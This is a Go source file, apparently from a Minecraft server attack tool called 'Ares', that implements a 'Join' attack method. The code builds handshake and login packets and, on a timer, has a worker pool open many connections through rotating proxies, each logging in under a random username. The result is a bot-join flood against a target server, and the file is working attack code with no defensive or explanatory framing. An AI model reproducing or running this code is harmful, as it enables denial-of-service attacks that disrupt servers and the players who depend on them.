package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils"
	"Ares/utils/mcutils"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"github.com/panjf2000/ants/v2"
)

type Join struct {
	Config          *core.AttackConfig
	isRunning       bool
	handshakePacket packet.Packet
	pool            *ants.Pool
}

func (j *Join) Start() {
	var err error
	j.pool, err = ants.NewPool(j.Config.PerDelay, ants.WithPreAlloc(true))
	if err != nil {
		log.Fatal(err)
	}
	ip, port, err := net.SplitHostPort(j.Config.Host)
	if err != nil {
		fmt.Println(err)
		return
	}
	iport, err := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
		return
	}

	j.handshakePacket = mcutils.GetHandshakePacket(ip, iport, j.Config.Version, mcutils.Login)

	j.isRunning = true

	done := make(chan struct{})

	for i := 0; i < j.Config.Loops; i++ {
		j.loop(done)
	}
}

func (j *Join) loop(done chan struct{}) {
	ticker := time.NewTicker(j.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < j.Config.PerDelay; i++ {
				j.pool.Submit(j.connect)
			}
		case <-done:
			return
		}
	}
}

func (j *Join) connect() {
	conn, err := minecraft.DialMc(j.Config.Host, j.Config.ProxyManager.GetNext())
	if err != nil {
		return
	}
	conn.WritePacket(j.handshakePacket)
	conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(10), j.Config.Version))
	defer conn.Close()
}

func (j *Join) Stop() {
	j.isRunning = false
}
